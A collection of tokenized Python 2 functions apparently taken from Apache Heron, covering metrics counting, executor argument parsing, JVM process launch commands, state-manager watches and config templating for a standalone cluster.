def execute_tuple ( self , stream_id , source_component , latency_in_ns ) : self . update_count ( self . EXEC_COUNT , key = stream_id ) self . update_reduced_metric ( self . EXEC_LATENCY , latency_in_ns , stream_id ) self . update_count ( self . EXEC_TIME_NS , incr_by = latency_in_ns , key = stream_id ) global_stream_id = source_component + "/" + stream_id self . update_count ( self . EXEC_COUNT , key = global_stream_id ) self . update_reduced_metric ( self . EXEC_LATENCY , latency_in_ns , global_stream_id ) self . update_count ( self . EXEC_TIME_NS , incr_by = latency_in_ns , key = global_stream_id )
def deserialize_data_tuple ( self , stream_id , source_component , latency_in_ns ) : self . update_count ( self . TUPLE_DESERIALIZATION_TIME_NS , incr_by = latency_in_ns , key = stream_id ) global_stream_id = source_component + "/" + stream_id self . update_count ( self . TUPLE_DESERIALIZATION_TIME_NS , incr_by = latency_in_ns , key = global_stream_id )
def acked_tuple ( self , stream_id , source_component , latency_in_ns ) : self . update_count ( self . ACK_COUNT , key = stream_id ) self . update_reduced_metric ( self . PROCESS_LATENCY , latency_in_ns , stream_id ) global_stream_id = source_component + '/' + stream_id self . update_count ( self . ACK_COUNT , key = global_stream_id ) self . update_reduced_metric ( self . PROCESS_LATENCY , latency_in_ns , global_stream_id )
def failed_tuple ( self , stream_id , source_component , latency_in_ns ) : self . update_count ( self . FAIL_COUNT , key = stream_id ) self . update_reduced_metric ( self . FAIL_LATENCY , latency_in_ns , stream_id ) global_stream_id = source_component + '/' + stream_id self . update_count ( self . FAIL_COUNT , key = global_stream_id ) self . update_reduced_metric ( self . FAIL_LATENCY , latency_in_ns , global_stream_id )
def parse ( version ) : match = _REGEX . match ( version ) if match is None : raise ValueError ( '%s is not valid SemVer string' % version ) verinfo = match . groupdict ( ) verinfo [ 'major' ] = int ( verinfo [ 'major' ] ) verinfo [ 'minor' ] = int ( verinfo [ 'minor' ] ) verinfo [ 'patch' ] = int ( verinfo [ 'patch' ] ) return verinfo
def get_all_file_state_managers ( conf ) : state_managers = [ ] state_locations = conf . get_state_locations_of_type ( "file" ) for location in state_locations : name = location [ 'name' ] rootpath = os . path . expanduser ( location [ 'rootpath' ] ) LOG . info ( "Connecting to file state with rootpath: " + rootpath ) state_manager = FileStateManager ( name , rootpath ) state_managers . append ( state_manager ) return state_managers
def incr ( self , key , to_add = 1 ) : if key not in self . value : self . value [ key ] = CountMetric ( ) self . value [ key ] . incr ( to_add )
def update ( self , key , value ) : if key not in self . value : self . value [ key ] = ReducedMetric ( self . reducer ) self . value [ key ] . update ( value )
def add_key ( self , key ) : if key not in self . value : self . value [ key ] = ReducedMetric ( self . reducer )
def add_data_tuple ( self , stream_id , new_data_tuple , tuple_size_in_bytes ) : if ( self . current_data_tuple_set is None ) or ( self . current_data_tuple_set . stream . id != stream_id ) or ( len ( self . current_data_tuple_set . tuples ) >= self . data_tuple_set_capacity ) or ( self . current_data_tuple_size_in_bytes >= self . max_data_tuple_size_in_bytes ) : self . _init_new_data_tuple ( stream_id ) added_tuple = self . current_data_tuple_set . tuples . add ( ) added_tuple . CopyFrom ( new_data_tuple ) self . current_data_tuple_size_in_bytes += tuple_size_in_bytes self . total_data_emitted_in_bytes += tuple_size_in_bytes
def valid_path ( path ) : # check if the suffic of classpath suffix exists as directory if path . endswith ( '*' ) : Log . debug ( 'Checking classpath entry suffix as directory: %s' , path [ : - 1 ] ) if os . path . isdir ( path [ : - 1 ] ) : return True return False # check if the classpath entry is a directory Log . debug ( 'Checking classpath entry as directory: %s' , path ) if os . path . isdir ( path ) : return True else : # check if the classpath entry is a file Log . debug ( 'Checking classpath entry as file: %s' , path ) if os . path . isfile ( path ) : return True return False
def valid_java_classpath ( classpath ) : paths = classpath . split ( ':' ) for path_entry in paths : if not valid_path ( path_entry . strip ( ) ) : return False return True
def load_pex ( path_to_pex , include_deps = True ) : abs_path_to_pex = os . path . abspath ( path_to_pex ) Log . debug ( "Add a pex to the path: %s" % abs_path_to_pex ) if abs_path_to_pex not in sys . path : sys . path . insert ( 0 , os . path . dirname ( abs_path_to_pex ) ) # add dependencies to path if include_deps : for dep in _get_deps_list ( abs_path_to_pex ) : to_join = os . path . join ( os . path . dirname ( abs_path_to_pex ) , dep ) if to_join not in sys . path : Log . debug ( "Add a new dependency to the path: %s" % dep ) sys . path . insert ( 0 , to_join ) Log . debug ( "Python path: %s" % str ( sys . path ) )
def new_source ( self , source ) : source_streamlet = None if callable ( source ) : source_streamlet = SupplierStreamlet ( source ) elif isinstance ( source , Generator ) : source_streamlet = GeneratorStreamlet ( source ) else : raise RuntimeError ( "Builder's new source has to be either a Generator or a function" ) self . _sources . append ( source_streamlet ) return source_streamlet
def build ( self , bldr ) : stage_names = sets . Set ( ) for source in self . _sources : source . _build ( bldr , stage_names ) for source in self . _sources : if not source . _all_built ( ) : raise RuntimeError ( "Topology cannot be fully built! Are all sources added?" )
def __replace ( config , wildcards , config_file ) : for config_key in config : config_value = config [ config_key ] original_value = config_value if isinstance ( config_value , str ) : for token in wildcards : if wildcards [ token ] : config_value = config_value . replace ( token , wildcards [ token ] ) found = re . findall ( r'\${[A-Z_]+}' , config_value ) if found : raise ValueError ( "%s=%s in file %s contains unsupported or unset wildcard tokens: %s" % ( config_key , original_value , config_file , ", " . join ( found ) ) ) config [ config_key ] = config_value return config
def get_command_handlers ( ) : return { 'activate' : activate , 'config' : hconfig , 'deactivate' : deactivate , 'help' : cli_help , 'kill' : kill , 'restart' : restart , 'submit' : submit , 'update' : update , 'version' : version }
def initialize ( self , config , context ) : if SlidingWindowBolt . WINDOW_DURATION_SECS in config : self . window_duration = int ( config [ SlidingWindowBolt . WINDOW_DURATION_SECS ] ) else : self . logger . fatal ( "Window Duration has to be specified in the config" ) if SlidingWindowBolt . WINDOW_SLIDEINTERVAL_SECS in config : self . slide_interval = int ( config [ SlidingWindowBolt . WINDOW_SLIDEINTERVAL_SECS ] ) else : self . slide_interval = self . window_duration if self . slide_interval > self . window_duration : self . logger . fatal ( "Slide Interval should be <= Window Duration" ) # By modifying the config, we are able to setup the tick timer config [ api_constants . TOPOLOGY_TICK_TUPLE_FREQ_SECS ] = str ( self . slide_interval ) self . current_tuples = deque ( ) if hasattr ( self , 'saved_state' ) : if 'tuples' in self . saved_state : self . current_tuples = self . saved_state [ 'tuples' ]
def initialize ( self , config , context ) : if TumblingWindowBolt . WINDOW_DURATION_SECS in config : self . window_duration = int ( config [ TumblingWindowBolt . WINDOW_DURATION_SECS ] ) else : self . logger . fatal ( "Window Duration has to be specified in the config" ) # By modifying the config, we are able to setup the tick timer config [ api_constants . TOPOLOGY_TICK_TUPLE_FREQ_SECS ] = str ( self . window_duration ) self . current_tuples = deque ( ) if hasattr ( self , 'saved_state' ) : if 'tuples' in self . saved_state : self . current_tuples = self . saved_state [ 'tuples' ]
def getStmgrsRegSummary ( self , tmaster , callback = None ) : if not tmaster or not tmaster . host or not tmaster . stats_port : return reg_request = tmaster_pb2 . StmgrsRegistrationSummaryRequest ( ) request_str = reg_request . SerializeToString ( ) port = str ( tmaster . stats_port ) host = tmaster . host url = "http://{0}:{1}/stmgrsregistrationsummary" . format ( host , port ) request = tornado . httpclient . HTTPRequest ( url , body = request_str , method = 'POST' , request_timeout = 5 ) Log . debug ( 'Making HTTP call to fetch stmgrsregistrationsummary url: %s' , url ) try : client = tornado . httpclient . AsyncHTTPClient ( ) result = yield client . fetch ( request ) Log . debug ( "HTTP call complete." ) except tornado . httpclient . HTTPError as e : raise Exception ( str ( e ) ) # Check the response code - error if it is in 400s or 500s responseCode = result . code if responseCode >= 400 : message = "Error in getting exceptions from Tmaster, code: " + responseCode Log . error ( message ) raise tornado . gen . Return ( { "message" : message } ) # Parse the response from tmaster. reg_response = tmaster_pb2 . StmgrsRegistrationSummaryResponse ( ) reg_response . ParseFromString ( result . body ) # Send response ret = { } for stmgr in reg_response . registered_stmgrs : ret [ stmgr ] = True for stmgr in reg_response . absent_stmgrs : ret [ stmgr ] = False raise tornado . gen . Return ( ret )
def setup ( executor ) : # pylint: disable=unused-argument def signal_handler ( signal_to_handle , frame ) : # We would do nothing here but just exit # Just catch the SIGTERM and then cleanup(), registered with atexit, would invoke Log . info ( 'signal_handler invoked with signal %s' , signal_to_handle ) executor . stop_state_manager_watches ( ) sys . exit ( signal_to_handle ) def cleanup ( ) : Log . info ( 'Executor terminated; exiting all process in executor.' ) # Kill child processes first and wait for log collection to finish for pid in executor . processes_to_monitor . keys ( ) : os . kill ( pid , signal . SIGTERM ) time . sleep ( 5 ) # We would not wait or check whether process spawned dead or not os . killpg ( 0 , signal . SIGTERM ) # Redirect stdout and stderr to files in append mode # The filename format is heron-executor-<container_id>.stdxxx shardid = executor . shard log . configure ( logfile = 'heron-executor-%s.stdout' % shardid ) pid = os . getpid ( ) sid = os . getsid ( pid ) # POSIX prohibits the change of the process group ID of a session leader if pid <> sid : Log . info ( 'Set up process group; executor becomes leader' ) os . setpgrp ( ) # create new process group, become its leader Log . info ( 'Register the SIGTERM signal handler' ) signal . signal ( signal . SIGTERM , signal_handler ) Log . info ( 'Register the atexit clean up' ) atexit . register ( cleanup )
def main ( ) : # Since Heron on YARN runs as headless users, pex compiled # binaries should be exploded into the container working # directory. In order to do this, we need to set the # PEX_ROOT shell environment before forking the processes shell_env = os . environ . copy ( ) shell_env [ "PEX_ROOT" ] = os . path . join ( os . path . abspath ( '.' ) , ".pex" ) # Instantiate the executor, bind it to signal handlers and launch it executor = HeronExecutor ( sys . argv , shell_env ) executor . initialize ( ) start ( executor )
def init_from_parsed_args ( self , parsed_args ) : self . shard = parsed_args . shard self . topology_name = parsed_args . topology_name self . topology_id = parsed_args . topology_id self . topology_defn_file = parsed_args . topology_defn_file self . state_manager_connection = parsed_args . state_manager_connection self . state_manager_root = parsed_args . state_manager_root self . state_manager_config_file = parsed_args . state_manager_config_file self . tmaster_binary = parsed_args . tmaster_binary self . stmgr_binary = parsed_args . stmgr_binary self . metrics_manager_classpath = parsed_args . metrics_manager_classpath self . metricscache_manager_classpath = parsed_args . metricscache_manager_classpath # '=' can be parsed in a wrong way by some schedulers (aurora) hence it needs to be escaped. # It is escaped in two different ways. '(61)' is the new escaping. '&equals;' was # the original replacement but it is not friendly to bash and is causing issues. The original # escaping is still left there for reference and backward compatibility purposes (to be # removed after no topology needs it) self . instance_jvm_opts = base64 . b64decode ( parsed_args . instance_jvm_opts . lstrip ( '"' ) . rstrip ( '"' ) . replace ( '(61)' , '=' ) . replace ( '&equals;' , '=' ) ) self . classpath = parsed_args . classpath # Needed for Docker environments since the hostname of a docker container is the container's # id within docker, rather than the host's hostname. NOTE: this 'HOST' env variable is not # guaranteed to be set in all Docker executor environments (outside of Marathon) if is_docker_environment ( ) : self . master_host = os . environ . get ( 'HOST' ) if 'HOST' in os . environ else socket . gethostname ( ) else : self . master_host = socket . gethostname ( ) self . master_port = parsed_args . master_port self . tmaster_controller_port = parsed_args . tmaster_controller_port self . tmaster_stats_port = parsed_args . tmaster_stats_port self . heron_internals_config_file = parsed_args . heron_internals_config_file self . override_config_file = parsed_args . override_config_file self . component_ram_map = map ( lambda x : { x . split ( ':' ) [ 0 ] : int ( x . split ( ':' ) [ 1 ] ) } , parsed_args . component_ram_map . split ( ',' ) ) self . component_ram_map = functools . reduce ( lambda x , y : dict ( x . items ( ) + y . items ( ) ) , self . component_ram_map ) # component_jvm_opts_in_base64 itself is a base64-encoding-json-map, which is appended with # " at the start and end. It also escapes "=" to "&equals" due to aurora limitation # And the json is a map from base64-encoding-component-name to base64-encoding-jvm-options self . component_jvm_opts = { } # First we need to decode the base64 string back to a json map string. # '=' can be parsed in a wrong way by some schedulers (aurora) hence it needs to be escaped. # It is escaped in two different ways. '(61)' is the new escaping. '&equals;' was # the original replacement but it is not friendly to bash and is causing issues. The original # escaping is still left there for reference and backward compatibility purposes (to be # removed after no topology needs it) component_jvm_opts_in_json = base64 . b64decode ( parsed_args . component_jvm_opts . lstrip ( '"' ) . rstrip ( '"' ) . replace ( '(61)' , '=' ) . replace ( '&equals;' , '=' ) ) if component_jvm_opts_in_json != "" : for ( k , v ) in json . loads ( component_jvm_opts_in_json ) . items ( ) : # In json, the component name and JVM options are still in base64 encoding self . component_jvm_opts [ base64 . b64decode ( k ) ] = base64 . b64decode ( v ) self . pkg_type = parsed_args . pkg_type self . topology_binary_file = parsed_args . topology_binary_file self . heron_java_home = parsed_args . heron_java_home self . shell_port = parsed_args . shell_port self . heron_shell_binary = parsed_args . heron_shell_binary self . metrics_manager_port = parsed_args . metrics_manager_port self . metricscache_manager_master_port = parsed_args . metricscache_manager_master_port self . metricscache_manager_stats_port = parsed_args . metricscache_manager_stats_port self . cluster = parsed_args . cluster self . role = parsed_args . role self . environment = parsed_args . environment self . instance_classpath = parsed_args . instance_classpath self . metrics_sinks_config_file = parsed_args . metrics_sinks_config_file self . scheduler_classpath = parsed_args . scheduler_classpath self . scheduler_port = parsed_args . scheduler_port self . python_instance_binary = parsed_args . python_instance_binary self . cpp_instance_binary = parsed_args . cpp_instance_binary self . is_stateful_topology = ( parsed_args . is_stateful . lower ( ) == 'true' ) self . checkpoint_manager_classpath = parsed_args . checkpoint_manager_classpath self . checkpoint_manager_port = parsed_args . checkpoint_manager_port self . checkpoint_manager_ram = parsed_args . checkpoint_manager_ram self . stateful_config_file = parsed_args . stateful_config_file self . metricscache_manager_mode = parsed_args . metricscache_manager_mode if parsed_args . metricscache_manager_mode else "disabled" self . health_manager_mode = parsed_args . health_manager_mode self . health_manager_classpath = '%s:%s' % ( self . scheduler_classpath , parsed_args . health_manager_classpath ) self . jvm_remote_debugger_ports = parsed_args . jvm_remote_debugger_ports . split ( "," ) if parsed_args . jvm_remote_debugger_ports else None
def parse_args ( args ) : Log . info ( "Input args: %r" % args ) parser = argparse . ArgumentParser ( ) parser . add_argument ( "--shard" , type = int , required = True ) parser . add_argument ( "--topology-name" , required = True ) parser . add_argument ( "--topology-id" , required = True ) parser . add_argument ( "--topology-defn-file" , required = True ) parser . add_argument ( "--state-manager-connection" , required = True ) parser . add_argument ( "--state-manager-root" , required = True ) parser . add_argument ( "--state-manager-config-file" , required = True ) parser . add_argument ( "--tmaster-binary" , required = True ) parser . add_argument ( "--stmgr-binary" , required = True ) parser . add_argument ( "--metrics-manager-classpath" , required = True ) parser . add_argument ( "--instance-jvm-opts" , required = True ) parser . add_argument ( "--classpath" , required = True ) parser . add_argument ( "--master-port" , required = True ) parser . add_argument ( "--tmaster-controller-port" , required = True ) parser . add_argument ( "--tmaster-stats-port" , required = True ) parser . add_argument ( "--heron-internals-config-file" , required = True ) parser . add_argument ( "--override-config-file" , required = True ) parser . add_argument ( "--component-ram-map" , required = True ) parser . add_argument ( "--component-jvm-opts" , required = True ) parser . add_argument ( "--pkg-type" , required = True ) parser . add_argument ( "--topology-binary-file" , required = True ) parser . add_argument ( "--heron-java-home" , required = True ) parser . add_argument ( "--shell-port" , required = True ) parser . add_argument ( "--heron-shell-binary" , required = True ) parser . add_argument ( "--metrics-manager-port" , required = True ) parser . add_argument ( "--cluster" , required = True ) parser . add_argument ( "--role" , required = True ) parser . add_argument ( "--environment" , required = True ) parser . add_argument ( "--instance-classpath" , required = True ) parser . add_argument ( "--metrics-sinks-config-file" , required = True ) parser . add_argument ( "--scheduler-classpath" , required = True ) parser . add_argument ( "--scheduler-port" , required = True ) parser . add_argument ( "--python-instance-binary" , required = True ) parser . add_argument ( "--cpp-instance-binary" , required = True ) parser . add_argument ( "--metricscache-manager-classpath" , required = True ) parser . add_argument ( "--metricscache-manager-master-port" , required = True ) parser . add_argument ( "--metricscache-manager-stats-port" , required = True ) parser . add_argument ( "--metricscache-manager-mode" , required = False ) parser . add_argument ( "--is-stateful" , required = True ) parser . add_argument ( "--checkpoint-manager-classpath" , required = True ) parser . add_argument ( "--checkpoint-manager-port" , required = True ) parser . add_argument ( "--checkpoint-manager-ram" , type = long , required = True ) parser . add_argument ( "--stateful-config-file" , required = True ) parser . add_argument ( "--health-manager-mode" , required = True ) parser . add_argument ( "--health-manager-classpath" , required = True ) parser . add_argument ( "--jvm-remote-debugger-ports" , required = False , help = "ports to be used by a remote debugger for JVM instances" ) parsed_args , unknown_args = parser . parse_known_args ( args [ 1 : ] ) if unknown_args : Log . error ( 'Unknown argument: %s' % unknown_args [ 0 ] ) parser . print_help ( ) sys . exit ( 1 ) return parsed_args
def _get_metricsmgr_cmd ( self , metricsManagerId , sink_config_file , port ) : metricsmgr_main_class = 'org.apache.heron.metricsmgr.MetricsManager' metricsmgr_cmd = [ os . path . join ( self . heron_java_home , 'bin/java' ) , # We could not rely on the default -Xmx setting, which could be very big, # for instance, the default -Xmx in Twitter mesos machine is around 18GB '-Xmx1024M' , '-XX:+PrintCommandLineFlags' , '-verbosegc' , '-XX:+PrintGCDetails' , '-XX:+PrintGCTimeStamps' , '-XX:+PrintGCDateStamps' , '-XX:+PrintGCCause' , '-XX:+UseGCLogFileRotation' , '-XX:NumberOfGCLogFiles=5' , '-XX:GCLogFileSize=100M' , '-XX:+PrintPromotionFailure' , '-XX:+PrintTenuringDistribution' , '-XX:+PrintHeapAtGC' , '-XX:+HeapDumpOnOutOfMemoryError' , '-XX:+UseConcMarkSweepGC' , '-XX:+PrintCommandLineFlags' , '-Xloggc:log-files/gc.metricsmgr.log' , '-Djava.net.preferIPv4Stack=true' , '-cp' , self . metrics_manager_classpath , metricsmgr_main_class , '--id=' + metricsManagerId , '--port=' + str ( port ) , '--topology=' + self . topology_name , '--cluster=' + self . cluster , '--role=' + self . role , '--environment=' + self . environment , '--topology-id=' + self . topology_id , '--system-config-file=' + self . heron_internals_config_file , '--override-config-file=' + self . override_config_file , '--sink-config-file=' + sink_config_file ] return Command ( metricsmgr_cmd , self . shell_env )
def _get_metrics_cache_cmd ( self ) : metricscachemgr_main_class = 'org.apache.heron.metricscachemgr.MetricsCacheManager' metricscachemgr_cmd = [ os . path . join ( self . heron_java_home , 'bin/java' ) , # We could not rely on the default -Xmx setting, which could be very big, # for instance, the default -Xmx in Twitter mesos machine is around 18GB '-Xmx1024M' , '-XX:+PrintCommandLineFlags' , '-verbosegc' , '-XX:+PrintGCDetails' , '-XX:+PrintGCTimeStamps' , '-XX:+PrintGCDateStamps' , '-XX:+PrintGCCause' , '-XX:+UseGCLogFileRotation' , '-XX:NumberOfGCLogFiles=5' , '-XX:GCLogFileSize=100M' , '-XX:+PrintPromotionFailure' , '-XX:+PrintTenuringDistribution' , '-XX:+PrintHeapAtGC' , '-XX:+HeapDumpOnOutOfMemoryError' , '-XX:+UseConcMarkSweepGC' , '-XX:+PrintCommandLineFlags' , '-Xloggc:log-files/gc.metricscache.log' , '-Djava.net.preferIPv4Stack=true' , '-cp' , self . metricscache_manager_classpath , metricscachemgr_main_class , "--metricscache_id" , 'metricscache-0' , "--master_port" , self . metricscache_manager_master_port , "--stats_port" , self . metricscache_manager_stats_port , "--topology_name" , self . topology_name , "--topology_id" , self . topology_id , "--system_config_file" , self . heron_internals_config_file , "--override_config_file" , self . override_config_file , "--sink_config_file" , self . metrics_sinks_config_file , "--cluster" , self . cluster , "--role" , self . role , "--environment" , self . environment ] return Command ( metricscachemgr_cmd , self . shell_env )
def _get_healthmgr_cmd ( self ) : healthmgr_main_class = 'org.apache.heron.healthmgr.HealthManager' healthmgr_cmd = [ os . path . join ( self . heron_java_home , 'bin/java' ) , # We could not rely on the default -Xmx setting, which could be very big, # for instance, the default -Xmx in Twitter mesos machine is around 18GB '-Xmx1024M' , '-XX:+PrintCommandLineFlags' , '-verbosegc' , '-XX:+PrintGCDetails' , '-XX:+PrintGCTimeStamps' , '-XX:+PrintGCDateStamps' , '-XX:+PrintGCCause' , '-XX:+UseGCLogFileRotation' , '-XX:NumberOfGCLogFiles=5' , '-XX:GCLogFileSize=100M' , '-XX:+PrintPromotionFailure' , '-XX:+PrintTenuringDistribution' , '-XX:+PrintHeapAtGC' , '-XX:+HeapDumpOnOutOfMemoryError' , '-XX:+UseConcMarkSweepGC' , '-XX:+PrintCommandLineFlags' , '-Xloggc:log-files/gc.healthmgr.log' , '-Djava.net.preferIPv4Stack=true' , '-cp' , self . health_manager_classpath , healthmgr_main_class , "--cluster" , self . cluster , "--role" , self . role , "--environment" , self . environment , "--topology_name" , self . topology_name , "--metricsmgr_port" , self . metrics_manager_port ] return Command ( healthmgr_cmd , self . shell_env )
def _get_tmaster_processes ( self ) : retval = { } tmaster_cmd_lst = [ self . tmaster_binary , '--topology_name=%s' % self . topology_name , '--topology_id=%s' % self . topology_id , '--zkhostportlist=%s' % self . state_manager_connection , '--zkroot=%s' % self . state_manager_root , '--myhost=%s' % self . master_host , '--master_port=%s' % str ( self . master_port ) , '--controller_port=%s' % str ( self . tmaster_controller_port ) , '--stats_port=%s' % str ( self . tmaster_stats_port ) , '--config_file=%s' % self . heron_internals_config_file , '--override_config_file=%s' % self . override_config_file , '--metrics_sinks_yaml=%s' % self . metrics_sinks_config_file , '--metricsmgr_port=%s' % str ( self . metrics_manager_port ) , '--ckptmgr_port=%s' % str ( self . checkpoint_manager_port ) ] tmaster_env = self . shell_env . copy ( ) if self . shell_env is not None else { } tmaster_cmd = Command ( tmaster_cmd_lst , tmaster_env ) if os . environ . get ( 'ENABLE_HEAPCHECK' ) is not None : tmaster_cmd . env . update ( { 'LD_PRELOAD' : "/usr/lib/libtcmalloc.so" , 'HEAPCHECK' : "normal" } ) retval [ "heron-tmaster" ] = tmaster_cmd if self . metricscache_manager_mode . lower ( ) != "disabled" : retval [ "heron-metricscache" ] = self . _get_metrics_cache_cmd ( ) if self . health_manager_mode . lower ( ) != "disabled" : retval [ "heron-healthmgr" ] = self . _get_healthmgr_cmd ( ) retval [ self . metricsmgr_ids [ 0 ] ] = self . _get_metricsmgr_cmd ( self . metricsmgr_ids [ 0 ] , self . metrics_sinks_config_file , self . metrics_manager_port ) if self . is_stateful_topology : retval . update ( self . _get_ckptmgr_process ( ) ) return retval
def _get_ckptmgr_process ( self ) : ckptmgr_main_class = 'org.apache.heron.ckptmgr.CheckpointManager' ckptmgr_ram_mb = self . checkpoint_manager_ram / ( 1024 * 1024 ) ckptmgr_cmd = [ os . path . join ( self . heron_java_home , "bin/java" ) , '-Xms%dM' % ckptmgr_ram_mb , '-Xmx%dM' % ckptmgr_ram_mb , '-XX:+PrintCommandLineFlags' , '-verbosegc' , '-XX:+PrintGCDetails' , '-XX:+PrintGCTimeStamps' , '-XX:+PrintGCDateStamps' , '-XX:+PrintGCCause' , '-XX:+UseGCLogFileRotation' , '-XX:NumberOfGCLogFiles=5' , '-XX:GCLogFileSize=100M' , '-XX:+PrintPromotionFailure' , '-XX:+PrintTenuringDistribution' , '-XX:+PrintHeapAtGC' , '-XX:+HeapDumpOnOutOfMemoryError' , '-XX:+UseConcMarkSweepGC' , '-XX:+UseConcMarkSweepGC' , '-Xloggc:log-files/gc.ckptmgr.log' , '-Djava.net.preferIPv4Stack=true' , '-cp' , self . checkpoint_manager_classpath , ckptmgr_main_class , '-t' + self . topology_name , '-i' + self . topology_id , '-c' + self . ckptmgr_ids [ self . shard ] , '-p' + self . checkpoint_manager_port , '-f' + self . stateful_config_file , '-o' + self . override_config_file , '-g' + self . heron_internals_config_file ] retval = { } retval [ self . ckptmgr_ids [ self . shard ] ] = Command ( ckptmgr_cmd , self . shell_env ) return retval
def _get_heron_support_processes ( self ) : retval = { } retval [ self . heron_shell_ids [ self . shard ] ] = Command ( [ '%s' % self . heron_shell_binary , '--port=%s' % self . shell_port , '--log_file_prefix=%s/heron-shell-%s.log' % ( self . log_dir , self . shard ) , '--secret=%s' % self . topology_id ] , self . shell_env ) return retval
def _wait_process_std_out_err ( self , name , process ) : proc . stream_process_stdout ( process , stdout_log_fn ( name ) ) process . wait ( )
def _start_processes ( self , commands ) : Log . info ( "Start processes" ) processes_to_monitor = { } # First start all the processes for ( name , command ) in commands . items ( ) : p = self . _run_process ( name , command ) processes_to_monitor [ p . pid ] = ProcessInfo ( p , name , command ) # Log down the pid file log_pid_for_process ( name , p . pid ) with self . process_lock : self . processes_to_monitor . update ( processes_to_monitor )
def start_state_manager_watches ( self ) : Log . info ( "Start state manager watches" ) statemgr_config = StateMgrConfig ( ) statemgr_config . set_state_locations ( configloader . load_state_manager_locations ( self . cluster , state_manager_config_file = self . state_manager_config_file , overrides = { "heron.statemgr.connection.string" : self . state_manager_connection } ) ) try : self . state_managers = statemanagerfactory . get_all_state_managers ( statemgr_config ) for state_manager in self . state_managers : state_manager . start ( ) except Exception as ex : Log . error ( "Found exception while initializing state managers: %s. Bailing out..." % ex ) traceback . print_exc ( ) sys . exit ( 1 ) # pylint: disable=unused-argument def on_packing_plan_watch ( state_manager , new_packing_plan ) : Log . debug ( "State watch triggered for PackingPlan update on shard %s. Existing: %s, New: %s" % ( self . shard , str ( self . packing_plan ) , str ( new_packing_plan ) ) ) if self . packing_plan != new_packing_plan : Log . info ( "PackingPlan change detected on shard %s, relaunching effected processes." % self . shard ) self . update_packing_plan ( new_packing_plan ) Log . info ( "Updating executor processes" ) self . launch ( ) else : Log . info ( "State watch triggered for PackingPlan update but plan not changed so not relaunching." ) for state_manager in self . state_managers : # The callback function with the bound # state_manager as first variable. onPackingPlanWatch = functools . partial ( on_packing_plan_watch , state_manager ) state_manager . get_packing_plan ( self . topology_name , onPackingPlanWatch ) Log . info ( "Registered state watch for packing plan changes with state manager %s." % str ( state_manager ) )
def run ( self , name , config , builder ) : if not isinstance ( name , str ) : raise RuntimeError ( "Name has to be a string type" ) if not isinstance ( config , Config ) : raise RuntimeError ( "config has to be a Config type" ) if not isinstance ( builder , Builder ) : raise RuntimeError ( "builder has to be a Builder type" ) bldr = TopologyBuilder ( name = name ) builder . build ( bldr ) bldr . set_config ( config . _api_config ) bldr . build_and_submit ( )
def _modules_to_main ( modList ) : if not modList : return main = sys . modules [ '__main__' ] for modname in modList : if isinstance ( modname , str ) : try : mod = __import__ ( modname ) except Exception : sys . stderr . write ( 'warning: could not import %s\n.  ' 'Your function may unexpectedly error due to this import failing;' 'A version mismatch is likely.  Specific error was:\n' % modname ) print_exec ( sys . stderr ) else : setattr ( main , mod . __name__ , mod )
def _load_class ( cls , d ) : for k , v in d . items ( ) : if isinstance ( k , tuple ) : typ , k = k if typ == 'property' : v = property ( * v ) elif typ == 'staticmethod' : v = staticmethod ( v ) # pylint: disable=redefined-variable-type elif typ == 'classmethod' : v = classmethod ( v ) setattr ( cls , k , v ) return cls
def save_module ( self , obj ) : self . modules . add ( obj ) self . save_reduce ( subimport , ( obj . __name__ , ) , obj = obj )
def tail ( filename , n ) : size = os . path . getsize ( filename ) with open ( filename , "rb" ) as f : fm = mmap . mmap ( f . fileno ( ) , 0 , mmap . MAP_SHARED , mmap . PROT_READ ) try : for i in xrange ( size - 1 , - 1 , - 1 ) : if fm [ i ] == '\n' : n -= 1 if n == - 1 : break return fm [ i + 1 if i else 0 : ] . splitlines ( ) finally : fm . close ( )
def get_serializer ( context ) : cluster_config = context . get_cluster_config ( ) serializer_clsname = cluster_config . get ( constants . TOPOLOGY_SERIALIZER_CLASSNAME , None ) if serializer_clsname is None : return PythonSerializer ( ) else : try : topo_pex_path = context . get_topology_pex_path ( ) pex_loader . load_pex ( topo_pex_path ) serializer_cls = pex_loader . import_and_get_class ( topo_pex_path , serializer_clsname ) serializer = serializer_cls ( ) return serializer except Exception as e : raise RuntimeError ( "Error with loading custom serializer class: %s, with error message: %s" % ( serializer_clsname , str ( e ) ) )
def template_slave_hcl ( cl_args , masters ) : slave_config_template = "%s/standalone/templates/slave.template.hcl" % cl_args [ "config_path" ] slave_config_actual = "%s/standalone/resources/slave.hcl" % cl_args [ "config_path" ] masters_in_quotes = [ '"%s"' % master for master in masters ] template_file ( slave_config_template , slave_config_actual , { "<nomad_masters:master_port>" : ", " . join ( masters_in_quotes ) } )
def template_scheduler_yaml ( cl_args , masters ) : single_master = masters [ 0 ] scheduler_config_actual = "%s/standalone/scheduler.yaml" % cl_args [ "config_path" ] scheduler_config_template = "%s/standalone/templates/scheduler.template.yaml" % cl_args [ "config_path" ] template_file ( scheduler_config_template , scheduler_config_actual , { "<scheduler_uri>" : "http://%s:4646" % single_master } )
def template_uploader_yaml ( cl_args , masters ) : single_master = masters [ 0 ] uploader_config_template = "%s/standalone/templates/uploader.template.yaml" % cl_args [ "config_path" ] uploader_config_actual = "%s/standalone/uploader.yaml" % cl_args [ "config_path" ] template_file ( uploader_config_template , uploader_config_actual , { "<http_uploader_uri>" : "http://%s:9000/api/v1/file/upload" % single_master } )
def template_apiserver_hcl ( cl_args , masters , zookeepers ) : single_master = masters [ 0 ] apiserver_config_template = "%s/standalone/templates/apiserver.template.hcl" % cl_args [ "config_path" ] apiserver_config_actual = "%s/standalone/resources/apiserver.hcl" % cl_args [ "config_path" ] replacements = { "<heron_apiserver_hostname>" : '"%s"' % get_hostname ( single_master , cl_args ) , "<heron_apiserver_executable>" : '"%s/heron-apiserver"' % config . get_heron_bin_dir ( ) if is_self ( single_master ) else '"%s/.heron/bin/heron-apiserver"' % get_remote_home ( single_master , cl_args ) , "<zookeeper_host:zookeeper_port>" : "," . join ( [ '%s' % zk if ":" in zk else '%s:2181' % zk for zk in zookeepers ] ) , "<scheduler_uri>" : "http://%s:4646" % single_master } template_file ( apiserver_config_template , apiserver_config_actual , replacements )
def template_statemgr_yaml ( cl_args , zookeepers ) : statemgr_config_file_template = "%s/standalone/templates/statemgr.template.yaml" % cl_args [ "config_path" ] statemgr_config_file_actual = "%s/standalone/statemgr.yaml" % cl_args [ "config_path" ] template_file ( statemgr_config_file_template , statemgr_config_file_actual , { "<zookeeper_host:zookeeper_port>" : "," . join ( [ '"%s"' % zk if ":" in zk else '"%s:2181"' % zk for zk in zookeepers ] ) } )
